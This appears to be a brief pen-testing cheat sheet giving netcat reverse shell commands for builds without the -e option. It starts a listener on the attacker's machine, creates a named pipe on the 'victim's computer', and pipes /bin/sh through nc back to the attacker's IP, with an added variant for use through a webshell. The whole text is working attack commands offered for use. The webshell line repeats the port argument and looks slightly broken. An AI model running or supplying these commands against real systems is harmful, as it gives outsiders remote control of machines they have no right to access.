// If netcat doesn't have -e command enabled (wasn't compiled with the -DGAPING_SECURITY_HOLE command)
// Got this idea from https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem

// On your system

nc -l PORT_NUMBER

// On victims computer
// Make a named pipe
// On some linux systems

mknod /tmp/backpipe p 

// On MacOS

mkfifo /tmp/backpipe

// Then execute the following command

/bin/sh 0</tmp/backpipe | nc YOUR_MACHINE_IP PORT_ON_WHICH_NC_IS_LISTENING 1>/tmp/backpipe

// In case you are using a execution medium like a webshell, then use

/bin/sh -c "/bin/sh 0</tmp/backpipe | nc YOUR_MACHINE_IP PORT_ON_WHICH_NC_IS_LISTENING 443 1>/tmp/backpipe"
